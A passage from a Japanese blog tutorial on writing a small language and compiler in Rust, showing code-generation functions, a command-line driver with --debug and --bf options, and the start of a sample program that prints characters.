<span id="cb34-69"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-69" aria-hidden="true" tabindex="-1"></a>                <span class="cn">Err</span>(<span class="pp">CodegenError::</span>InvalidVariableName <span class="op">{</span></span>
<span id="cb34-70"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-70" aria-hidden="true" tabindex="-1"></a>                    name<span class="op">:</span> ptr<span class="op">.</span>to_string()<span class="op">,</span></span>
<span id="cb34-71"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-71" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span>)</span>
<span id="cb34-72"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-72" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb34-73"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-73" aria-hidden="true" tabindex="-1"></a>                <span class="kw">let</span> header <span class="op">=</span> emitter<span class="op">.</span>emit_loop_begin()<span class="op">;</span></span>
<span id="cb34-74"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-74" aria-hidden="true" tabindex="-1"></a>                <span class="kw">let</span> body <span class="op">=</span> block(emitter<span class="op">,</span> body)<span class="op">?;</span></span>
<span id="cb34-75"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-75" aria-hidden="true" tabindex="-1"></a>                <span class="kw">let</span> footer <span class="op">=</span> emitter<span class="op">.</span>emit_loop_end()<span class="op">;</span></span>
<span id="cb34-76"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-76" aria-hidden="true" tabindex="-1"></a>                <span class="cn">Ok</span>(<span class="pp">format!</span>(<span class="st">&quot;{}{}{}&quot;</span><span class="op">,</span> header<span class="op">,</span> body<span class="op">,</span> footer))</span>
<span id="cb34-77"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-77" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
<span id="cb34-78"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-78" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb34-79"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-79" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-80"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-80" aria-hidden="true" tabindex="-1"></a>        _ <span class="op">=&gt;</span> <span class="cn">Err</span>(<span class="pp">CodegenError::</span>NotImplemented)<span class="op">,</span></span>
<span id="cb34-81"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-81" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb34-82"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-82" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><code>expression()</code> はこんな感じになっています。<code>Emitter</code> の <code>emit_move_ptr()</code>, <code>emit_add()</code>, <code>emit_call_{putchar,emitter}()</code> メソッドのラッパのような関数 <code>move_ptr()</code>, <code>add()</code>, <code>function_call()</code> を作り、<code>Expression</code> のパターンマッチで対応する関数を呼び出しています。</p>
<div class="sourceCode" id="cb35"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb35-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> expression<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(</span>
<span id="cb35-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-2" aria-hidden="true" tabindex="-1"></a>    emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span></span>
<span id="cb35-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-3" aria-hidden="true" tabindex="-1"></a>    tree<span class="op">:</span> <span class="op">&amp;</span>Expression<span class="op">,</span></span>
<span id="cb35-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-4" aria-hidden="true" tabindex="-1"></a>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb35-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">match</span> tree <span class="op">{</span></span>
<span id="cb35-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-6" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Expression::</span>AssignAdd(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(p)<span class="op">,</span> <span class="pp">Rhs::</span>Number(n)) <span class="op">=&gt;</span> move_ptr(emitter<span class="op">,</span> p<span class="op">,</span> <span class="op">*</span>n)<span class="op">,</span></span>
<span id="cb35-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-7" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Expression::</span>AssignSub(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(p)<span class="op">,</span> <span class="pp">Rhs::</span>Number(n)) <span class="op">=&gt;</span> move_ptr(emitter<span class="op">,</span> p<span class="op">,</span> <span class="op">-*</span>n)<span class="op">,</span></span>
<span id="cb35-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-8" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Expression::</span>AssignAdd(<span class="pp">Lhs::</span>Dereference(p)<span class="op">,</span> <span class="pp">Rhs::</span>Number(n)) <span class="op">=&gt;</span> add(emitter<span class="op">,</span> p<span class="op">,</span> <span class="op">*</span>n)<span class="op">,</span></span>
<span id="cb35-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-9" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Expression::</span>AssignSub(<span class="pp">Lhs::</span>Dereference(p)<span class="op">,</span> <span class="pp">Rhs::</span>Number(n)) <span class="op">=&gt;</span> add(emitter<span class="op">,</span> p<span class="op">,</span> <span class="op">-*</span>n)<span class="op">,</span></span>
<span id="cb35-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-10" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Expression::</span>FunctionCall(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(p)) <span class="op">=&gt;</span> function_call(emitter<span class="op">,</span> p)<span class="op">,</span></span>
<span id="cb35-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-11" aria-hidden="true" tabindex="-1"></a>        _ <span class="op">=&gt;</span> <span class="cn">Err</span>(<span class="pp">CodegenError::</span>NotImplemented)<span class="op">,</span></span>
<span id="cb35-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb35-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb35-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-15" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> move_ptr<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(</span>
<span id="cb35-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-16" aria-hidden="true" tabindex="-1"></a>    emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span></span>
<span id="cb35-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-17" aria-hidden="true" tabindex="-1"></a>    ptr<span class="op">:</span> <span class="op">&amp;</span><span class="dt">str</span><span class="op">,</span></span>
<span id="cb35-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-18" aria-hidden="true" tabindex="-1"></a>    offset<span class="op">:</span> <span class="dt">i32</span><span class="op">,</span></span>
<span id="cb35-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-19" aria-hidden="true" tabindex="-1"></a>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb35-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ptr <span class="op">!=</span> <span class="st">&quot;ptr&quot;</span> <span class="op">{</span></span>
<span id="cb35-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-21" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Err</span>(<span class="pp">CodegenError::</span>InvalidVariableName <span class="op">{</span></span>
<span id="cb35-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-22" aria-hidden="true" tabindex="-1"></a>            name<span class="op">:</span> ptr<span class="op">.</span>to_string()<span class="op">,</span></span>
<span id="cb35-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-23" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span>)</span>
<span id="cb35-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-24" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb35-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-25" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Ok</span>(emitter<span class="op">.</span>emit_move_ptr(offset))</span>
<span id="cb35-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-26" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb35-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-27" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb35-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-29" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> add<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span> ptr<span class="op">:</span> <span class="op">&amp;</span><span class="dt">str</span><span class="op">,</span> n<span class="op">:</span> <span class="dt">i32</span>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb35-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ptr <span class="op">!=</span> <span class="st">&quot;ptr&quot;</span> <span class="op">{</span></span>
<span id="cb35-31"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-31" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Err</span>(<span class="pp">CodegenError::</span>InvalidVariableName <span class="op">{</span></span>
<span id="cb35-32"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-32" aria-hidden="true" tabindex="-1"></a>            name<span class="op">:</span> ptr<span class="op">.</span>to_string()<span class="op">,</span></span>
<span id="cb35-33"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-33" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span>)</span>
<span id="cb35-34"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-34" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb35-35"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-35" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Ok</span>(emitter<span class="op">.</span>emit_add(n))</span>
<span id="cb35-36"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-36" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb35-37"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-37" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb35-38"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-38" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-39"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-39" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> function_call<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(</span>
<span id="cb35-40"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-40" aria-hidden="true" tabindex="-1"></a>    emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span></span>
<span id="cb35-41"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-41" aria-hidden="true" tabindex="-1"></a>    funcname<span class="op">:</span> <span class="op">&amp;</span><span class="dt">str</span><span class="op">,</span></span>
<span id="cb35-42"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-42" aria-hidden="true" tabindex="-1"></a>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb35-43"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-43" aria-hidden="true" tabindex="-1"></a>    <span class="cf">match</span> funcname <span class="op">{</span></span>
<span id="cb35-44"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-44" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;getchar&quot;</span> <span class="op">=&gt;</span> <span class="cn">Ok</span>(emitter<span class="op">.</span>emit_call_getchar())<span class="op">,</span></span>
<span id="cb35-45"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-45" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;putchar&quot;</span> <span class="op">=&gt;</span> <span class="cn">Ok</span>(emitter<span class="op">.</span>emit_call_putchar())<span class="op">,</span></span>
<span id="cb35-46"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-46" aria-hidden="true" tabindex="-1"></a>        _ <span class="op">=&gt;</span> <span class="cn">Err</span>(<span class="pp">CodegenError::</span>InvalidFunctionName <span class="op">{</span></span>
<span id="cb35-47"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-47" aria-hidden="true" tabindex="-1"></a>            name<span class="op">:</span> funcname<span class="op">.</span>to_string()<span class="op">,</span></span>
<span id="cb35-48"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-48" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span>)<span class="op">,</span></span>
<span id="cb35-49"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-49" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb35-50"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb35-50" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h2 id="全部を組み合わせてみる">全部を組み合わせてみる</h2>
<p>必要なものは揃ったので、これらを組み合わせてみます。<a href="https://github.com/Tosainu/chiya/blob/54f3e9ba782222477a437d3517e6738ad3261824/src/bin/chiya.rs"><code>src/bin/chiya.rs</code></a> をこんな感じに変更しました。標準入力から読んだ文字列を、字句解析、構文解析、コード生成と順番に渡しているだけです。実行時、コマンドラインに <code>--debug</code> オプションが付いていたときにはトークン列と構文木を確認できるようにしています。また、<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#とりあえず動かしてみる">最初に実装した Brainf**k のコンパイル処理</a>はせっかくなので <code>compile_bf()</code> 関数に切り出してコマンドラインオプション <code>--bf</code> の有無で切り替えられるようにしてみました。</p>
<div class="sourceCode" id="cb36"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb36-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">std::io::</span><span class="bu">Read</span><span class="op">;</span></span>
<span id="cb36-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">chiya::codegen::</span><span class="op">{</span><span class="kw">self</span><span class="op">,</span> <span class="pp">emitter::</span>Emitter<span class="op">,</span> <span class="pp">llvm::</span>LLVM<span class="op">};</span></span>
<span id="cb36-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">chiya::</span>parser<span class="op">;</span></span>
<span id="cb36-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-5" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">chiya::</span>token<span class="op">;</span></span>
<span id="cb36-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-7" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> main() <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span>()<span class="op">,</span> <span class="pp">failure::</span><span class="bu">Error</span><span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb36-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> args <span class="op">=</span> <span class="pp">std::env::</span>args()<span class="op">.</span><span class="pp">collect::</span><span class="op">&lt;</span><span class="dt">Vec</span><span class="op">&lt;</span>_<span class="op">&gt;&gt;</span>()<span class="op">;</span></span>
<span id="cb36-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> debug <span class="op">=</span> args<span class="op">.</span>iter()<span class="op">.</span>any(<span class="op">|</span>a<span class="op">|</span> <span class="op">*</span>a <span class="op">==</span> <span class="st">&quot;--debug&quot;</span>)<span class="op">;</span></span>
<span id="cb36-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> bf <span class="op">=</span> args<span class="op">.</span>iter()<span class="op">.</span>any(<span class="op">|</span>a<span class="op">|</span> <span class="op">*</span>a <span class="op">==</span> <span class="st">&quot;--bf&quot;</span>)<span class="op">;</span></span>
<span id="cb36-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> <span class="kw">mut</span> src <span class="op">=</span> <span class="dt">String</span><span class="pp">::</span>new()<span class="op">;</span></span>
<span id="cb36-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-14" aria-hidden="true" tabindex="-1"></a>    <span class="pp">std::io::</span>stdin()<span class="op">.</span>read_to_string(<span class="op">&amp;</span><span class="kw">mut</span> src)<span class="op">?;</span></span>
<span id="cb36-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> e <span class="op">=</span> <span class="pp">LLVM::</span>new()<span class="op">;</span></span>
<span id="cb36-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> bf <span class="op">{</span></span>
<span id="cb36-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-19" aria-hidden="true" tabindex="-1"></a>        compile_bf(e<span class="op">,</span> <span class="op">&amp;</span>src)<span class="op">?;</span></span>
<span id="cb36-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb36-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-21" aria-hidden="true" tabindex="-1"></a>        compile(e<span class="op">,</span> <span class="op">&amp;</span>src<span class="op">,</span> debug)<span class="op">?;</span></span>
<span id="cb36-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-22" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb36-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-24" aria-hidden="true" tabindex="-1"></a>    <span class="cn">Ok</span>(())</span>
<span id="cb36-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb36-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-27" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> compile<span class="op">&lt;</span>E<span class="op">:</span> Emitter<span class="op">&gt;</span>(<span class="kw">mut</span> e<span class="op">:</span> E<span class="op">,</span> src<span class="op">:</span> <span class="op">&amp;</span><span class="dt">str</span><span class="op">,</span> debug<span class="op">:</span> <span class="dt">bool</span>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span>()<span class="op">,</span> <span class="pp">failure::</span><span class="bu">Error</span><span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb36-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-28" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> tokens <span class="op">=</span> <span class="pp">token::</span>tokenize(<span class="op">&amp;</span>src)<span class="op">?;</span></span>
<span id="cb36-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-29" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> debug <span class="op">{</span></span>
<span id="cb36-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-30" aria-hidden="true" tabindex="-1"></a>        <span class="pp">eprintln!</span>(<span class="st">&quot;tokens: {:?}&quot;</span><span class="op">,</span> tokens)<span class="op">;</span></span>
<span id="cb36-31"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-31" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb36-32"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-33"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-33" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> tree <span class="op">=</span> <span class="pp">parser::</span>program(<span class="op">&amp;</span>tokens)<span class="op">.</span>ok_or_else(<span class="op">||</span> <span class="pp">failure::format_err!</span>(<span class="st">&quot;parse error&quot;</span>))<span class="op">?;</span></span>
<span id="cb36-34"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-34" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> debug <span class="op">{</span></span>
<span id="cb36-35"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-35" aria-hidden="true" tabindex="-1"></a>        <span class="pp">eprintln!</span>(<span class="st">&quot;syntax tree:</span><span class="sc">\n</span><span class="st">{:#?}&quot;</span><span class="op">,</span> tree<span class="op">.</span><span class="dv">1</span>)<span class="op">;</span></span>
<span id="cb36-36"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-36" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb36-37"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-38"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-38" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> code <span class="op">=</span> <span class="pp">codegen::</span>gen(<span class="op">&amp;</span><span class="kw">mut</span> e<span class="op">,</span> <span class="op">&amp;</span>tree<span class="op">.</span><span class="dv">1</span>)<span class="op">?;</span></span>
<span id="cb36-39"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-39" aria-hidden="true" tabindex="-1"></a>    <span class="pp">println!</span>(<span class="st">&quot;{}&quot;</span><span class="op">,</span> code)<span class="op">;</span></span>
<span id="cb36-40"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-41"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-41" aria-hidden="true" tabindex="-1"></a>    <span class="cn">Ok</span>(())</span>
<span id="cb36-42"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-42" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb36-43"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-43" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-44"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-44" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> compile_bf<span class="op">&lt;</span>E<span class="op">:</span> Emitter<span class="op">&gt;</span>(<span class="kw">mut</span> e<span class="op">:</span> E<span class="op">,</span> src<span class="op">:</span> <span class="op">&amp;</span><span class="dt">str</span>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span>()<span class="op">,</span> <span class="pp">failure::</span><span class="bu">Error</span><span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb36-45"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-45" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
<span id="cb36-46"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb36-46" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>ではいろいろ動かしてみます。まずは ABC を表示するだけの簡単なものから。</p>
<div class="sourceCode" id="cb37"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb37-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">65</span><span class="op">;</span> <span class="co">// ptr[0] = 'A'</span></span>
<span id="cb37-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-2" aria-hidden="true" tabindex="-1"></a>putchar<span class="op">();</span></span>
<span id="cb37-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span>  <span class="co">// 'B'</span></span>
<span id="cb37-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb37-4" aria-hidden="true" tabindex="-1"></a>putchar<span class="op">();</span></span>
